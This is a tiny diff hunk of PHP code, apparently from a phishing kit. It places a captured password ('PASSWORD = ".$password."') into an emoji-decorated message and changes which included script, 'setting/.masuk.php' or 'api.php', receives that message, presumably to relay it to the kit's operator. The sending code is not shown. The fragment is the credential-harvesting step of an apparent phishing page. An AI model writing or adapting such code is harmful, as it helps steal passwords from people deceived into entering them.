@@ -71,7 +71,7 @@ PASSWORD  = ".$password."
 😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳😳
 ");
 
-$url = $msg;include("setting/.masuk.php");
+$url = $msg;include("api.php");
 
 }
 
